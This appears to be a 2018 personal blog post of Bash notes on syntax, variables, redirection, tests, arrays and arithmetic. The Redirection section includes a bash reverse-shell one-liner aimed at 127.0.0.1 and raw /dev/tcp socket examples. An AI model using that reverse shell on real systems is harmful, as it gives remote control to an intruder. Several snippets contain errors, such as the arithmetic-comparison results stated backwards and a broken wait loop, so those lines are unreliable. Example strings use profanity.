---
layout: post
title: Bash Notes
date: 2018-08-28 22:09 +0800
tags:
  - SysAdmin
---


Bash is not that simple!

{% include toc.html %}

## Statements

Control flows and loops.

```shell
# 'if' statement
if true; then
  echo true
else
  echo false
fi

# 'for' statement
for i in 1 2 3; do
  echo $i
done

# classic 'for' loop
for (( i = 0; i < 10; i++ )); do
  echo $i
done

# 'while' statement
while true; do
  sleep 0.5
  echo fuck
done

# 'until' statement
until [[ `ls /tmp/file_created 2> /dev/null` ]]; do
  sleep 1 && echo 'No file!!!'
done

# 'case' statement
case "$v" in
wildcard)
  echo FUCK
  ;;
*)
  echo YOU
  ;;
esac

```

## Strings

```shell
# string literal
a=HELLO
b='HELLO'
c="HELLO"

# escaped chars
d=$'HELLO\n'
e=$(echo -e 'HELLO\n')
```

## Special Variables

[Internal Veriables](http://tldp.org/LDP/abs/html/internalvariables.html)

```shell
$$    # pid of shell
$!    # last pid
$#    # argc
$@    # $1 $2 ...
$*    # $1 $2 ...
$_    # last arg
$?    # ret val
"$*"  # "$1 $2 ..."
"$@"  # "$1" "$2" ...
# $@, "$@", and $* will explode to multiple args, but "$*" will not

# assume $@ = 1 2 3
echo $@   # 1 2 3
shift
echo $@   # 2 3
echo $1   # 2

echo $RANDOM  # 29033
echo $(( RANDOM % 100 ))

str=ABCDEFG

# substring
echo ${str:2} # CDEFG
echo ${str:2:2} # CD

# remove prefix
echo ${str#*C} # DEFG

# remove suffix
echo ${str%D*} # ABC

# replace
echo ${str//ABCD/EFG} # EFGEFG
```

## Parameter Substitution

```shell
var1=1
var2=2
echo ${var1-$var2}   # 1
echo ${var3-$var2}   # 2

echo ${var=abc}   # abc
echo ${var=xyz}   # abc
```

## Trap

Trap is used to set signal handler

```shell
handler() {
  echo 'sigint'
}

trap handler SIGINT
sleep infinity # linux only

trap SIGINT # restore
```

## Redirection

[https://www.gnu.org/software/bash/manual/html_node/Redirections.html](https://www.gnu.org/software/bash/manual/html_node/Redirections.html)

```shell
cat / 2> /dev/null
cat / 2>&1 | cat > /dev/null

bash <<< 'sleep 1; ls'
bash <(echo -e 'id\ngroups')

# heredoc
cat <<EOF
shell=$SHELL
EOF

# heredoc without explaining special characters
cat <<'EOF'
shell=$SHELL
EOF

python << EOF
for i in range(10):
    print(2 ** i)
EOF

strace ls >& file # redirect stdout and stderr to file

cat /etc/passwd | tee passwd.bak # stdout and also write to a file
cat /etc/passwd | tee -a passwd.bak # append

# Connections
echo fuck > /dev/tcp/google.com/80
echo fuck > /dev/udp/google.com/80

# HTTP request using bash
exec 3<>/dev/tcp/google.com/80
echo -en 'GET / HTTP/1.1\r\nHost: google.com\r\n\r\n' >&3
cat <&3 # the socket is at /dev/fd/3
file /dev/fd/3 # /dev/fd/3: broken symbolic link to socket:[440833]
exec 3<&- # close file descriptor
file /dev/fd/3 # /dev/fd/3: cannot open `/dev/fd/3' (No such file or directory)

# Reverse shell
bash -i >& /dev/tcp/127.0.0.1/11111 0>&1

# nc
bash -c 'exec 87<>/dev/tcp/example.com/80; cat <&87 & cat >&87' <<EOF
GET / HTTP/1.1
Host: example.com

EOF
```

> Explained: This is a redirection. No pipe is involved. 0<&1 means connect whatever is currently opened on file descriptor 1 to file descriptor 0. Since the previous redirection >& /dev/tcp/HOST/PORT connected fd 1 (the default for an output redirection) to /dev/tcp/HOST/PORT, i.e. opened a TCP socket, this duplicates the TCP connection to file descriptor 0 (i.e. the same socket is now also open on fd 0, this is different from 0</dev/tcp/HOST/PORT which would open a different socket to the same server).

## Conditions

```shell
true; echo $? # 0
false; echo $? # 1
[ -f /etc/passwd ] && cat /etc/passwd
( true && false ); echo $? # 1
[ -f / ]; echo $? # 1
[ -d / ]; echo $? # 0
# -n (not empty string), -z (null string), -a, -o, -eq, -ne, -gt, -lt, -ge, -le
# -ef (identical file), -nt (newer then), -ot (older then)
# -b (is block), -d, -e (exists), -f, -L (symlink), -s (file not empty), -x (executable)

# [[ is a syntactical feature, [ is an executable
which [ # /usr/bin/[

# [[ allows && and ||
[[ -f / && -d / ]]; echo $? # 1
[[ -f / || -d / ]]; echo $? # 0
[[ -f / && ( -f / || -d / ) ]]; echo $? # F and (F or T) => F (1)
[[ -f / || ( -f / || -d / ) ]]; echo $? # F or (F or T) => T (0)
[[ -f / || ( -f / && -d / ) ]]; echo $? # F or (F and T) => F (1)

# [[ handles string
s='fuck you'
[ $s = 'fuck you' ]; echo $? # 2 (bash: [: too many arguments)
[[ $s = 'fuck you' ]]; echo $? # 0

# [[ uses better matching
s=fuck
[[ $s = f* ]]; echo $? # 0
[[ $s = a* ]]; echo $? # 1
[[ $s =~ ^f..k$ ]]; echo $? # 0
[[ $s =~ ^a..k$ ]]; echo $? # 1
```

## Arrays

[https://www.linuxjournal.com/content/bash-arrays](https://www.linuxjournal.com/content/bash-arrays)

```shell
arr=(Hello World)
# arr[0]=Hello
# arr[1]=World
echo ${arr[0]} ${arr[1]}

${arr[*]}         # all of the items in the array
${!arr[*]}        # all of the indexes in the array
${#arr[*]}        # number of items in the array
${#arr[1]}        # length of item zero
# indexes start from 0

a=("${arr[*]}")   # $a contains one item
a=("${arr[@]}")   # $a contains many items

a+=(item)         # append one element
a+=(item1 item2)  # append multiple
```

## Expansions

```shell
echo .* * # ls -a
echo /etc/pas??? # /etc/passwd (match)
echo /etc/pas?? # /etc/pas?? (no match)

echo fuck {you,her} # fuck you her
echo 'fuck '{you,her} # fuck you fuck her
echo 'fuck '{you,her}, # fuck you, fuck her,

echo {1..5} # 1 2 3 4 5
a={1..5}; echo $a # {1..5}
cat <<< {1..5} # {1..5}
for i in {1..5}; do echo -n $i,; done # 1,2,3,4,5,
```

## Arithmetic Expansion

```shell
echo $(( 1 + 1 )) # 2

i=123
echo $(( i++ ))   # 123
echo $i           # 124

a=(1 2 3)
echo $(( a[1] + a[2] )) # 3

echo $(( 1 < 2 )) # 0 (true)
echo $(( 1 > 2 )) # 1 (false)

# FizzBuzz in bash
for (( i = 1; i <= 100; i++ )); do
  if (( i % 15 == 0 )); then
    echo FizzBuzz
  elif (( i % 3 == 0 )); then
    echo Fizz
  elif (( i % 5 == 0 )); then
    echo Buzz
  else
    echo $i
  fi
done
```

Order of precedence

```
id++ id--           variable post-increment and post-decrement
++id --id           variable pre-increment and pre-decrement
- +                 unary minus and plus
! ~                 logical and bitwise negation
**                  exponentiation
* / %               multiplication, division, remainder
+ -                 addition, subtraction
<< >>               left and right bitwise shifts
<= >= < >           comparison
== !=               equality and inequality
&                   bitwise AND
^                   bitwise exclusive OR
|                   bitwise OR
&&                  logical AND
||                  logical OR
expr?expr:expr      conditional operator
= *= /= %= += -= <<= >>= &= ^= |=
                    assignment
expr1 , expr2       comma
```


## Shebang

Execute content using bash (you can add extra arguments after the shebang)

```shell
#!/bin/bash
```

Self-extract zip

```shell
echo '#!/usr/bin/env unzip' > archive
cat data.zip >> archive
chmod +x archive

./archive # extract itself
```

## Background Tasks

Basics

```shell
sleep 10 &
fg # move backgound task to foreground
```

Waiting for tasks

```shell
pids=()

for i in 1 2 3; do
  sleep $i & # run task in the background
  pids+=($!) # save task pid
done

# wait for tasks done
for pid in pids; do
  wait $pid
done
```

## Other

```shell
# set (bash builtin) - Setting bash options

set -u          # error if using unset vars
set -o nounse
set -x          # print command before executing
set -o xtrace
set +x          # unset
set +o xtrace
set -e          # exit if error
set -o errexit
set -o pipefail # consider errors while piping
bash -euxo pipefail script.sh

# declare (bash builtin) - Set variable values and attributes.

declare     # all variables and functions
declare -i  # all integers
declare -a  # all arrays
declare -f  # all functions
declare +i  # unset integer attribute

declare -r var # rovar is read-only
declare -i integer
declare -a array
declare -f function

integer=123
echo $integer # 123
integer=abc
echo $integer # 0

a=123
export b=123
declare -x c=123
bash -c 'echo a=$a b=$b c=$c' # a= b=123 c=123

# env - Managing envorinment variables

env a=2 # setting environment variable
env python # execute utility


false || ( echo FUCK; exit 1; ) # will not exit
false || { echo FUCK; exit 1; } # will exit

(exit 0) && echo Success || echo Failed # Success
(exit 1) && echo Success || echo Failed # Failed
```
